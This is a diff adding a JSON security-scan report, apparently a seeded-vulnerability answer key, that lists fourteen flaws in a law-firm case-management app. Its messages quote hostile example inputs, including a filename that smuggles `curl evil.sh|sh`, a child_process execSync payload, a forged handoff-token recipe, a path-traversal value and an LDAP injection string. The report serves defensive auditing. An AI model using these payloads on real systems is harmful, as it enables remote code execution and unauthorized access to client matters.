@@ -1,0 +1,360 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-execsync",
+      "path": "app/lib/convert.server.ts",
+      "start": {
+        "line": 16,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertMatterDocument() builds a shell command string with execSync(`pandoc ${sourcePath} -o ${outPath} -t ${targetFormat}`) using sourceFilename/targetFormat taken directly from request.formData() in app/routes/_app.documents.tsx (lines 20-24), restricted only to firm_admin/attorney/paralegal roles. Neither value is sanitized or allowlisted, so an authenticated user can inject shell metacharacters (e.g. filename=`a; curl evil.sh|sh #`) to execute arbitrary OS commands as the server process. The sibling function renderCaseSummary() in the same file (lines 24-32) shows the safe pattern: an allowlisted format and spawn() with an argv array and shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function",
+      "path": "app/lib/feeEstimate.server.ts",
+      "start": {
+        "line": 15,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 53,
+        "offset": 0
+      },
+      "extra": {
+        "message": "estimateMatterFee() compiles an attacker-supplied string directly into executable JavaScript via `new Function(\"params\", `return (${formula});`)`. It is invoked from app/routes/_app.matters.new.tsx (lines 34-44) with `formula` taken straight from the unauthenticated GET query string `feeFormula` (only the page itself requires firm_admin/attorney role, but this is a GET loader executed on every page view). A payload such as `(()=>{require('child_process').execSync('...')})()` or any expression reaching global scope executes arbitrary server-side code.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.forged-signature-accepted",
+      "path": "app/lib/portal.server.ts",
+      "start": {
+        "line": 38,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 42,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveHandoffToken() decodes the client-message handoff token's payload and, when a signature is present but does NOT match the expected HMAC, still returns the (forged) payload instead of rejecting it (`if (signature !== expected) { return payload; }`). It's used unauthenticated-token-wise in app/routes/_app.client.messages.tsx (lines 19-26): any logged-in user (any role, via the parent _app.tsx auth check) can craft `?handoff=<base64url of {matterId:'<any-id>',clientId:..,exp:9999999999999}>.garbage` and the loader will fetch and display that matter's approved messages, bypassing per-matter/per-client authorization entirely. Contrast with the correctly-implemented verifyFilingReceipt() in the same file, which uses crypto.timingSafeEqual and rejects any mismatch.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-cross-matter-update",
+      "path": "app/routes/_app.matters.$id.tsx",
+      "start": {
+        "line": 259,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 267,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The 'update_task_status' action intent authorizes the request against the matter identified by params.id (the URL), but then updates a Task record looked up only by `taskId` from the form body with no `matterId` filter: `prisma.task.update({ where: { id: taskId }, data: updateTaskData })`. Any attorney/paralegal assigned to matter A can POST intent=update_task_status with a taskId belonging to matter B (which they aren't assigned to) to change that task's status/completedAt. Contrast with 'update_doc_visibility' (lines 402-416) and 'update_deadline_status' (lines 455-469) in the same file, which correctly scope the lookup via `where: { id, matterId }` before updating.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-cross-matter-message-approve",
+      "path": "app/routes/_app.matters.$id.tsx",
+      "start": {
+        "line": 305,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 313,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The 'approve_message' action intent updates a Message record looked up only by `messageId` from the form body, with no `matterId` scoping: `prisma.message.update({ where: { id: messageId }, data: { status: 'approved', ... } })`. An attorney/paralegal/admin with access to any single matter can approve a draft message belonging to a different matter they have no assignment to, exposing that message to that matter's client (draft messages become client-visible once status='approved', per the loader's msgWhere filter at lines 133-146).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.file.path-traversal-write",
+      "path": "app/lib/archive.server.ts",
+      "start": {
+        "line": 32,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 33,
+        "col": 63,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportCaseBinder() joins the user-supplied `label` directly into a filesystem path with no sanitization: `path.join(BINDER_DIR, `${label}.json`)` followed by fs.writeFileSync. It's invoked from app/routes/_app.matters.$id.tsx (lines 520-523, 'export_binder' intent) with `label` taken verbatim from formData.get('label'). A value like `../../../../tmp/pwned` (or an absolute path) escapes BINDER_DIR and writes attacker-influenced JSON content to an arbitrary filesystem location writable by the process. Contrast with saveIntakeTemplate() in the same file (line 49), which correctly calls path.basename(templateName) before constructing the path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.privilege-escalation-loose-comparison",
+      "path": "app/lib/directorySync.server.ts",
+      "start": {
+        "line": 32,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 78,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyDirectoryAccessGrants(), invoked from app/routes/_app.admin.import-export.tsx (lines 238-239) as part of a firm_admin-triggered bulk directory-sync import, promotes a user to firm_admin if `row.role == 'firm_admin' || (result.access && grantLevel >= 5)`. `grantLevel` comes from `parseInt(row.level)` with no radix and no integer validation, and `result.access` (currently always the string \"0\", per fetchDirectoryAccessResult) is truthy in JS, so any imported CSV/row can be crafted (e.g. level='5abc') to satisfy the condition and grant firm_admin to an arbitrary email. The file's own applyDirectoryAccessGrantsReviewed() (lines 46-58) demonstrates the intended safe check (`===`, explicit radix, Number.isInteger, strict boolean), confirming applyDirectoryAccessGrants is the vulnerable path that remains wired into the live route.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-cookie-draft",
+      "path": "app/lib/intake.server.ts",
+      "start": {
+        "line": 19,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resumeMatterIntakeDraft() JSON.parses an attacker-controlled cookie (`matter_intake_draft`) and spreads the entire object into prisma.matter.create() with no schema validation: `const draft = JSON.parse(raw); return prisma.matter.create({ data: { ...draft, createdById } })`. It's invoked from app/routes/_app.matters.new.tsx (lines 55-57) for any firm_admin/attorney. Because the cookie is fully client-controlled and unvalidated, a user can set arbitrary Matter fields (clientId, attorneyId, status, sensitivity, etc.) that a normal form submission would otherwise constrain, e.g. attaching a new matter to any clientId in the system. Contrast with resumeTaskTemplateDraft() in the same file (lines 30-38), which validates the parsed draft against taskSchema before use.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.session-fixation",
+      "path": "app/lib/session.server.ts",
+      "start": {
+        "line": 73,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 79,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "activateDelegateAccess(), used by app/routes/delegate-access.$token.tsx to log in an invited co-counsel delegate, reuses whatever session the incoming request already carries (`const session = await getSession(request); session.set('userId', userId);`) instead of issuing a fresh session id. An attacker who plants a known session identifier on a victim's browser (classic session fixation) and lures them into redeeming a delegate-access invite link ends up sharing that pre-set session. The sibling function activateCoCounselAccess() (lines 88-96, same file) explicitly destroys the old session and mints a new one before attaching the user \u2014 its own comment states this is specifically to prevent a shared/previously-used browser from carrying over another session identifier \u2014 showing the fix was applied to one invite-redemption path but not the other.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "app/lib/staffDirectory.server.ts",
+      "start": {
+        "line": 63,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 63,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findAttorneyByBarEmail() builds an LDAP search filter by directly interpolating the caller-supplied `email` into the filter string: `(&(objectClass=person)(mail=${email}))`, then passes it to directoryClient.search(). It's invoked from app/routes/_app.admin.users.tsx with the raw `linkEmail` form value. An input such as `*)(|(mail=*` alters the filter's boolean structure (classic LDAP injection), potentially widening the match beyond the intended single record. Contrast with queryEmployeeDirectory() in the same file (lines 82-87), which correctly escapes special characters via escapeDirectoryFilterValue() before building the filter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: LDAP Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.audit.stack-trace-disclosure",
+      "path": "app/lib/compliance.server.ts",
+      "start": {
+        "line": 19,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 8,
+        "offset": 0
+      },
+      "extra": {
+        "message": "runComplianceSummary() returns the raw exception message and full stack trace (`{ error: e.message, stack: e.stack, entityType }`) to the caller whenever the client-supplied renderContext value is present/truthy, instead of the generic error used otherwise. This leaks internal implementation details (file paths, query structure, library internals) to any client able to set that header/context value.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.missing-token-expiry-check",
+      "path": "app/lib/clientPortal.server.ts",
+      "start": {
+        "line": 25,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "verifyKioskOverviewSession() validates the HMAC signature but never checks `payload.exp` before returning the session as valid, so a kiosk overview token never expires once issued. The sibling function verifyKioskMatterListSession() (lines 36-44, same file) correctly checks `if (payload.exp < Date.now()) return null;` \u2014 verifyKioskOverviewSession omits that check, allowing a leaked/shared shared-kiosk token to grant indefinite access to a client's matter overview.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.server-side-template-injection",
+      "path": "app/lib/noticeTemplates.server.ts",
+      "start": {
+        "line": 16,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewPracticeAreaNotice() compiles free-form, firm-admin-supplied template text with `Handlebars.compile(templateBody)` (no sandboxing, no noEscape restriction, default helpers enabled) and immediately executes it against merge data. Handlebars templates support helpers and prototype-touching constructs that have historically been used for template-injection/RCE gadgets; while this path is restricted to firm_admin (same-privilege), rendering untrusted template bodies through a full Handlebars compile is an unsafe sink compared to renderStandardMatterNotice() in the same file, which only ever compiles a fixed, firm-authored template string.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.data-exposure.secret-in-url-query",
+      "path": "app/lib/efiling.server.ts",
+      "start": {
+        "line": 15,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 110,
+        "offset": 0
+      },
+      "extra": {
+        "message": "submitCourtFiling() places the sensitive COURT_EFILING_KEY submitter credential directly into the URL query string (`?api_key=${apiKey}&...`) rather than in a header. URLs are commonly captured in server access logs, proxy logs, and browser/HTTP client history, so the credential can leak via any component that logs request URLs. syncBillingLedger() in the same file correctly passes its credential via an Authorization header instead.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
